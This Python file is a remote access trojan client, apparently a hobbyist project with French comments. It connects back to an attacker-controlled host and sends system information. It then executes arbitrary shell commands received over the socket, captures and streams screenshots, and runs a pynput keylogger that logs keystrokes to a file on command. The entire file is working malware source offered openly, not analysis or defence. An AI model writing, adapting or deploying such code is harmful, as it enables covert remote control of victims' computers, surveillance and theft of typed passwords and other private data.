#!/usr/bin/python3.7
import socket
import subprocess, os, platform
import pyscreenshot as ImageGrab
from PIL import ImageGrab
from pynput.keyboard import Key, Listener
import logging
#from threading import Thread
import threading
class KeyLoggerThread(threading.Thread):
    global Quit
    def __init__(self):
        super().__init__()
        self.stopNow = threading.Event()

    def run(self):
        logging.basicConfig(filename="keys.log",level=logging.DEBUG, format='%(asctime)s %(message)s')
        def on_press(key):
            logging.debug(str(key))
            if (self.stopNow.is_set()) :
                return False
        with Listener(on_press = on_press) as listener:
            listener.join()
    def stop(self):
        self.stopNow.set()

 
HOST = "localhost"  # attacker's IP adress (this is a random one, just to show you)
PORT = 6969 # attacker's port on which server is listening
 
# same syntax here as for the server
connexion_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connexion_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
connexion_socket.connect((HOST, PORT))
print("\n[*] Connected to " +HOST+ " on port " +str(PORT)+ ".\n")
KeyLoggerThread = KeyLoggerThread()
KeyLoggerThread.start()
connexion_socket.send(("Nom : "+os.name+"\nSysteme : "+platform.system()+"\nKernel : "+ platform.release()).encode())
 
while True:
    command = connexion_socket.recv(1024).decode()
    split_command = command.split()
    print("Received command : " +command)
    # if its quit, then break out and close socket
#   if command == "quit":
#        break

    if(command.split()[0] == "cd"):
            if len(command.split()) == 1:
                connexion_socket.send((os.getcwd()))
                print("DEBUG CD ==1")
            elif len(command.split()) == 2:
                print("DEBUG CD ==2")
                try:
                    os.chdir(command.split()[1])
                    connexion_socket.send(("Changed directory to " + os.getcwd()).encode())
                except OSError as winerror:
                    connexion_socket.send(("No such directory : " +os.getcwd()).encode())
    elif command == "stb" :
        im = ImageGrab.grab()
        im.save('pic.png')
        connexion_socket.send(("capturing").encode())
        pic = open("pic.png", "rb")
        picRead = pic.read(1024)
        while picRead != b'':
            connexion_socket.send(picRead)
            picRead = pic.read(1024)
        pic.close()
        os.remove("pic.png")
        connexion_socket.send(("complete").encode())
    elif command == "keylogger.status" :
        if KeyLoggerThread.isAlive() :
            connexion_socket.send(("ACTIVATED").encode())
        else :
            connexion_socket.send(("DISACTIVATED").encode())
    elif command == "keylogger.activate" :
        if KeyLoggerThread.isAlive() :
            connexion_socket.send(("ALREADY ACTIVATED").encode())
        else :
            KeyLoggerThread.start()
            connexion_socket.send(("THE KEYLOGGER HAS BEEN ACTIVATED").encode())
    elif command == "keylogger.deactivate" :
        if KeyLoggerThread.isAlive() :
            try:    
                KeyLoggerThread.stop()
            except:
                print(str(KeyLoggerThread.getName()) + ' could not be terminated')
            connexion_socket.send(("THE KEYLOGGER HAS BEEN DEACTIVATED").encode())
        else :
            connexion_socket.send(("ALREADY DEACTIVATED").encode())

 
    else:
        # do shell command
        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        # read output
        stdout_value = proc.stdout.read() + proc.stderr.read()
        stdout_value = stdout_value.decode()
        # send output to attacker
        print(stdout_value)
        if(stdout_value != ""):
            connexion_socket.send(stdout_value.encode())  # renvoit l'output  à l'attaquant
        else:
            connexion_socket.send((command+ " does not return anything").encode())
Quit = False
KeyLoggerThread.join() 
connexion_socket.close()